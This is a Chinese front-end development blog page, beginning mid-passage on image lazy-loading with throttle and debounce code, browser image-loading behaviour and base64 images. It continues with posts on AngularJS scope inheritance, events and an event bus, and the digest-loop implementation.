<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay, atleast) &#123;</span><br><span class="line">                let timeout = null</span><br><span class="line">                let startTime = new Date()</span><br><span class="line">                return function() &#123;</span><br><span class="line">                    const curTime = new Date()</span><br><span class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</span><br><span class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</span><br><span class="line">                        fn()</span><br><span class="line">                        startTime = curTime</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function debounced(fn,delay) &#123;</span><br><span class="line">  clearTimeout(timeoutID);  // reset timer</span><br><span class="line">  timeoutID = setTimeout(function() &#123;</span><br><span class="line">    // wait for some time</span><br><span class="line">    // and check if event happens again</span><br><span class="line">    fn()</span><br><span class="line">  &#125;, delay);</span><br><span class="line">&#125;;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="noopener">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;display: none;&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="noopener">链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/angular/angularissue.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/angular/angularissue.html" itemprop="url">
                  AngularJS issue
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-31T16:33:15+08:00">
                2017-10-31
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#$digest和$apply</p>
<p>当调用$digest的时候，只触发当前作用域和它的子作用域上的监控，但是当调用$apply的时候，会触发作用域树上的所有监控。</p>
<p>因此，从性能上讲，如果能确定自己作的这个数据变更所造成的影响范围，应当尽量调用$digest，只有当无法精确知道数据变更造成的影响范围时，才去用$apply，很暴力地遍历整个作用域树，调用其中所有的监控。</p>
<h1 id="视图模型的层次"><a href="#视图模型的层次" class="headerlink" title="视图模型的层次"></a>视图模型的层次</h1><p>在Angular中，存在作用域的继承。所谓作用域的继承，是指：如果两个视图有包含关系，内层视图对应的作用域可以共享外层视图作用域的数据。<br>以下情况会造成嵌套作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// 1. controller 套嵌</span><br><span class="line">如果两个控制器所对应的视图存在上下级关系，它们的作用域就自动产生继承关系</span><br><span class="line">html:</span><br><span class="line">&lt;body ng-app=&quot;test&quot;&gt;</span><br><span class="line">    &lt;div ng-controller=&quot;OuterCtrl&quot;&gt;//父域</span><br><span class="line">        &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</span><br><span class="line">        &lt;div ng-controller=&quot;InnerCtrl&quot;&gt;//子域</span><br><span class="line">            &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span ng-bind=&quot;b&quot;&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">js:</span><br><span class="line">var app = angular.module(&quot;test&quot;, []);</span><br><span class="line"></span><br><span class="line">app.controller(&quot;OuterCtrl&quot;, function ($scope) &#123;</span><br><span class="line">    $scope.a = 1;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.controller(&quot;InnerCtrl&quot;, function ($scope) &#123;</span><br><span class="line">    $scope.b = 100;</span><br><span class="line"></span><br><span class="line">    $scope.increasea = function() &#123;</span><br><span class="line">        $scope.a++;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//2.数组和对象属性迭代的时候,循环的每个元素都建立了单独的作用域</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li ng-repeat=&quot;member in members&quot;&gt;&#123;&#123;member.name&#125;&#125; in &#123;&#123;teamname&#125;&#125;&lt;/li&gt; //每一个都是子域，但可以共享父域的teamname</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">//3.使用ng-if,ng-include,ng-view等指令时构建的DOM，会形成自己的子域</span><br><span class="line"></span><br><span class="line">inner.html</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">outer.html</span><br><span class="line">&lt;div ng-controller=&quot;OuterCtrl&quot;&gt;</span><br><span class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;div ng-include=&quot;&apos;inner.html&apos;&quot;&gt;&lt;/div&gt;//ng-include会创建一层作用域，inner.html里面bind的name会使用OuterCtrl这个父域里面的name</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">function OuterCtrl($scope) &#123;</span><br><span class="line">    $scope.name = &quot;outer name&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>作用域继承的缺点就是，子域绑定值能继承父域同名绑定值的值，但是一旦子域绑定值，因为某种触发函数发生改变，父域同名绑定值不会随之改变<br>虽然可以通过$parent获取父域的同名绑定值，然后子域中做到同时修改，但如果在代码中使用了这种方式，意味着视图模型也只能这样包含，如果再中间插一层子域，<br>则同名关系变成$parent.$parent，使关系进一步复杂<br>所以，应当尽量避免父子作用域存在同名变量的情况</p>
<p>从可重用性角度来看，如果满分5分的话，整个应用的这些部分的得分应当是这样：</p>
<p>服务，比如说，对后端RESTful接口的AJAX调用，对本地存储的访问等，5分<br>控制器（也就是视图模型），2-3分<br>指令，这个要看情况，有的指令是当作对HTML元素体系的扩展来用的，有些是其他事情的<br>纯UI类型的指令，也可以算是控件，比如DatetimePicker，5分<br>有些用于沟通DOM跟视图模型的指令，2分<br>界面模板，这个基本就没有重用性了，1分</p>
<h1 id="模块机制-module的坑"><a href="#模块机制-module的坑" class="headerlink" title="模块机制-module的坑"></a>模块机制-module的坑</h1><p>1.覆盖问题<br>如果moduleA,同时依赖moduleB和moduleC,而moduleB和moduleC有同名的factoryD,那在moduleA使用factoryD的时候，<br>根据依赖顺序，如果moduleB在前，则moduleC的factoryD会覆盖moduleB的factoryD，moduleA使用的是moduleC的factoryD<br>如果在以上依赖情况基础上，moduleA自己又定义了同名factoryD,那么moduleA自己的factoryD会覆盖moduleC的factoryD</p>
<p>2.module不支持运行时添加依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">angular.module(&quot;some.components&quot;, [])</span><br><span class="line">    //这里定义了一些组件</span><br><span class="line">    ;</span><br><span class="line">//上面是一个组件库，集中存放于components.js中，要在自己的应用中使用，必须：</span><br><span class="line">angular.module(&quot;our.app&quot;, [&quot;some.components&quot;]);</span><br><span class="line"></span><br><span class="line">//不可以这样</span><br><span class="line">angular.module(&quot;our.app&quot;, []);</span><br><span class="line"></span><br><span class="line">require(&quot;components.js&quot;, function() &#123;</span><br><span class="line">    // angular.module(&quot;our.app&quot;).addDependency(&quot;some.components&quot;);</span><br><span class="line">    // ready to use</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p>1.在绑定表达式里面，只能使用自定义函数，不能使用原生函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123;abs(-1)&#125;&#125;&lt;/div&gt;//不允许这样使用</span><br></pre></td></tr></table></figure></p>
<p>如果确实需要调用原生函数，可以用一个自定义函数作包装，在自定义函数里面可以随意使用各种原生对象<br>绑定表达式里可以使用自定义函数，但如果只是对数据做简单处理可以使用过滤器</p>
<p>2.数组里有重复元素的情况，ng-repeat代码不能起作用，原因是Angular默认需要在数组中使用唯一索引<br>可以指定它使用序号作索引<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$scope.arr2 = [1, 1, 3];</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li ng-repeat=&quot;item in arr2 track by $index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
<p>但对象值有重复的话，不用像数组那么麻烦需要指定$index做索引，因为它是对象的key做索引，是不会重复的。</p>
<h1 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h1><p>angular事件流是一个通知广播的过程<br>现有A、B两个视图，每个视图又包含各自两个子视图，如果A视图的A1子视图想通知B视图的子视图B1一个业务事件(或传递某个消息)<br>那A1就发出业务通知，这个通知会沿着父作用域一路往上到达双方共同的祖先作用域<br>然后这个通知会以广播的形式从祖先作用域一级一级往下进行广播，直到到达需要的地方<br><img src="/image/angularissue.png" alt="issue1"><br>相关事件：<br>从作用域往上发送事件，使用scope.$emit。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scope.$emit(&quot;someEvent&quot;, &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>从作用域往下发送事件，使用scope.$broadcast<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scope.$broadcast(&quot;someEvent&quot;, &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这两个方法的第二个参数是要随事件带出的数据。<br>这两种方式传播事件，事件的发送方自己也会收到一份。<br>无论是$emit还是$broadcast发送的事件，都可以被接收，接收这两种事件的方式是一样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    // 这里从e上可以取到发送过来的数据</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>如果想要阻止$emit事件的继续传播，可以调用事件对象的stopPropagation()方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    e.stopPropagation();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>想要阻止$broadcast事件的传播,首先，调用事件对象的preventDefault()方法，<br>然后，在收取这个事件对象的时候，判断它的defaultPrevented属性，如果为true，就忽略此事件。<br>这个过程比较麻烦，其实一般是不需要管的，只要不监听对应的事件就可以了。<br>在实际使用过程中，也应当尽量少使用事件的广播，尤其是从较高的层级进行广播<br>上级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>下级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    if (e.defaultPrevented) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="事件总线"><a href="#事件总线" class="headerlink" title="事件总线"></a>事件总线</h2><p>事件流的通知过程效率低，而且很多下级视图可能根本不要接收消息，进行多余的广播，<br>所以组建订阅发布模式，接收方在这里订阅消息，发布方在这里发布消息，这个地方就是事件总线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app.factory(&quot;EventBus&quot;, function() &#123;</span><br><span class="line">    var eventMap = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    var EventBus = &#123;</span><br><span class="line">        on : function(eventType, handler) &#123; //订阅事件</span><br><span class="line">            //multiple event listener</span><br><span class="line">            if (!eventMap[eventType]) &#123;</span><br><span class="line">                eventMap[eventType] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            eventMap[eventType].push(handler);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        off : function(eventType, handler) &#123;</span><br><span class="line">            for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</span><br><span class="line">                if (eventMap[eventType][i] === handler) &#123;</span><br><span class="line">                    eventMap[eventType].splice(i, 1);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        fire : function(event) &#123; //发布事件</span><br><span class="line">            var eventType = event.type;</span><br><span class="line">            if (eventMap &amp;&amp; eventMap[eventType]) &#123;</span><br><span class="line">                for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</span><br><span class="line">                    eventMap[eventType][i](event);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    return EventBus;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/angular/angular-digest.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/angular/angular-digest.html" itemprop="url">
                  AngularJS Digest
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-28T16:33:15+08:00">
                2017-10-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>通常angularjs 环境中变量都绑定在Scope对象上，检测这些变量变化的机制也绑定在该对象上</p>
<p>为了检测数据发生变化，所以为每一个变量创建监听器<br>监听器包含两部分内容<br>一个监控函数,负责前后数据对比<br>一个监听函数，规定对数据变化做出什么响应</p>
<p>但是监听器需要有机制进行触发才能发挥作用<br>即调用监控函数，看数据是否发生变化，然后根据结果再调用监听函数，对变化做出响应</p>
<p>因此，在Scope对象上挂载函数和属性实现以上机制</p>
<p>Scope.$$watchers = []    用于保存注册过的所有监听器</p>
<p>Scope.prototype.$watch = function(watchFn, listenerFn) {} 用于将监控函数和监听函数组合成监听器，然后保存到$$watchers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn) &#123;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,//监控函数</span><br><span class="line">    listenerFn: listenerFn || function() &#123; &#125; //监听函数</span><br><span class="line">  &#125;;</span><br><span class="line">  this.$$watchers.push(watcher);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Scope.prototype.$$digestOnce = function() {}<br>具体的脏检查过程，初始化变更标记，遍历一遍$$watchers，<br>如果某个数据发生变化就执行对应监听函数，<br>并将变更标记设置true返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$digestOnce = function() &#123;</span><br><span class="line">  var self  = this;</span><br><span class="line">  var dirty;</span><br><span class="line">  _.forEach(this.$$watchers, function(watch) &#123;</span><br><span class="line">    var newValue = watch.watchFn(self);</span><br><span class="line">    var oldValue = watch.last;</span><br><span class="line">    if (newValue !== oldValue) &#123;</span><br><span class="line">      watch.listenerFn(newValue, oldValue, self);</span><br><span class="line">      dirty = true;</span><br><span class="line">    &#125;</span><br><span class="line">    watch.last = newValue;</span><br><span class="line">  &#125;);</span><br><span class="line">  return dirty;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Scope.prototype.$digest = function() {} 循环执行检测，保证监控器内部对属性进行的变更也能被检测到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  do &#123;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>如果仅执行一次digest，检测不到B监听器监听函数修改的A监听器监听的属性新值，<br>因此进行持续遍历所有监听器，直到监控的值停止变更<br>$digest为$$digestOnce包裹一个do-while“外层循环”，<br>如果第一次运行完，有监控值发生变更了，标记为dirty，所有监听器再运行第二次。这会一直运行，直到所有监控的值都不再变化，整个局面稳定下来了。<br>如果两个监听器互相监控了对方产生的变更，状态始终不会稳定，因此添加迭代数量ttl，限制迭代次数，保证循环检测的可控性，达到ttl就抛异常</p>
